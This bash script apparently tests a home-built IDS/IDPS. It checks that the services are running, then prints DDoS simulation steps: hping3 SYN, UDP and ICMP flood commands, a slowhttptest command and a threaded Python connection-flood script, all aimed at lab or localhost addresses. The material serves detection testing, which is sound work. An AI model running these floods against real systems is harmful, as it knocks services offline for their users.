#!/bin/bash
# Test script for live traffic detection
# Test live traffic detection with DDoS simulation
# This script helps verify that the IDS/IDPS system detects real DDoS attacks

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${GREEN}=== IDS/IDPS Live Traffic Testing Guide ===${NC}\n"

# Step 1: Verify system is ready
echo -e "${YELLOW}Step 1: Verifying system readiness...${NC}"

# Check backend is running
if ! curl -s http://localhost:8000/health > /dev/null; then
    echo -e "${RED}❌ Backend is not running. Start it with:${NC}"
    echo "   cd backend && ./run_backend.sh"
    exit 1
fi
echo -e "${GREEN}✅ Backend is running${NC}"

# Check database connection
if ! python3 -c "
import sys
sys.path.insert(0, 'backend')
from app.database import SessionLocal, engine
from sqlalchemy import text
try:
    with engine.connect() as conn:
        conn.execute(text('SELECT 1'))
    print('✅ Database connected')
    sys.exit(0)
except Exception as e:
    print(f'❌ Database error: {e}')
    sys.exit(1)
" 2>/dev/null; then
    echo -e "${GREEN}✅ Database is accessible${NC}"
else
    echo -e "${RED}❌ Database connection failed${NC}"
    exit 1
fi

# Check if GUI is running (optional)
if pgrep -f "python.*gui.*main.py" > /dev/null; then
    echo -e "${GREEN}✅ GUI is running${NC}"
else
    echo -e "${YELLOW}⚠️  GUI is not running (optional)${NC}"
    echo "   Start GUI with: cd gui && source .venv/bin/activate && python main.py"
fi

echo ""

# Step 2: Install required tools
echo -e "${YELLOW}Step 2: Checking DDoS testing tools...${NC}"

# Check hping3
if command -v hping3 &> /dev/null; then
    echo -e "${GREEN}✅ hping3 installed${NC}"
else
    echo -e "${YELLOW}⚠️  hping3 not found. Install with:${NC}"
    echo "   sudo apt-get install hping3"
fi

# Check if we're on the target machine or attacker machine
echo ""
echo -e "${YELLOW}Step 3: Starting traffic monitor via API...${NC}"

# Get auth token (you'll need to login first)
echo -e "${YELLOW}Note: You need to be logged in to the system to start monitoring${NC}"
echo -e "   The traffic monitor should be started via:"
echo -e "   1. Login to GUI: http://localhost:8000 (or via desktop GUI)"
echo -e "   2. Use admin credentials"
echo -e "   3. Start monitoring from dashboard"
echo -e "   OR"
echo -e "   curl -X POST http://localhost:8000/api/monitor/start \\"
echo -e "        -H 'Authorization: Bearer YOUR_TOKEN' \\"
echo -e "        -H 'Content-Type: application/json' \\"
echo -e "        -d '{\"threshold\": 0.50}'"
echo ""

# Step 4: DDoS simulation instructions
echo -e "${GREEN}=== DDoS Simulation Instructions ===${NC}\n"

cat << 'EOF'
Option A: From Kali Linux VM (Recommended)
-------------------------------------------
1. On Kali VM, install tools:
   sudo apt-get update
   sudo apt-get install -y hping3 slowhttptest nmap

2. Find target IP (Ubuntu VM running IDS):
   # From Ubuntu VM, get IP:
   ip addr show | grep "inet " | grep -v 127.0.0.1
   
   # Example target IP: 192.168.1.100

3. Launch SYN flood attack:
   # SYN flood (TCP)
   sudo hping3 -S --flood -V -p 80 192.168.1.100
   
   # UDP flood
   sudo hping3 --udp --flood -V -p 53 192.168.1.100
   
   # ICMP flood
   sudo hping3 --icmp --flood -V 192.168.1.100

4. Launch slow HTTP attack:
   slowhttptest -c 1000 -H -g -o /tmp/slowhttp -i 10 -r 200 -t GET -u http://192.168.1.100 -x 24 -p 3

Option B: From Ubuntu VM itself (Self-test)
---------------------------------------------
# UDP flood to localhost
sudo hping3 --udp --flood -V -p 80 127.0.0.1

# ICMP ping flood
sudo ping -f 127.0.0.1

# Multiple connections
for i in {1..10}; do
    curl -m 1 http://localhost:8000/health &
done

Option C: Using Python (Simple test)
-------------------------------------
# Create test_ddos.py:
import socket
import threading
import time

target = "127.0.0.1"  # or target IP
port = 8000

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            s.close()
        except:
            pass

for i in range(100):
    thread = threading.Thread(target=flood)
    thread.daemon = True
    thread.start()

time.sleep(60)  # Run for 60 seconds

EOF

echo ""
echo -e "${GREEN}=== Verification Steps ===${NC}\n"

cat << 'EOF'
1. Watch for alerts in GUI:
   - Dashboard should show increasing alert count
   - Alert table should populate with new entries
   - Source IPs should match attacker IPs
   - Attack type should be "DDoS"
   - Scores should be above threshold (default 0.50)

2. Check API directly:
   curl http://localhost:8000/api/alerts?page=1&page_size=10 \
        -H 'Authorization: Bearer YOUR_TOKEN' | jq

3. Monitor backend logs:
   # If running as service
   sudo journalctl -u ids-idps-backend -f
   
   # If running manually
   # Check terminal output for "🚨 Alert created" messages

4. Verify detection:
   - Alerts appear within 5-10 seconds of attack start
   - Multiple alerts for sustained attacks
   - Alert details show packet counts, protocols
   - KPIs update (alerts_24h increases)

EOF

echo ""
echo -e "${YELLOW}⚠️  Important Notes:${NC}"
echo "   - Run DDoS tests only in isolated lab environment"
echo "   - Monitor system resources during testing"
echo "   - Stop attacks after verification"
echo "   - Check that normal traffic still works"
echo ""

echo -e "${GREEN}✅ Testing guide complete!${NC}"

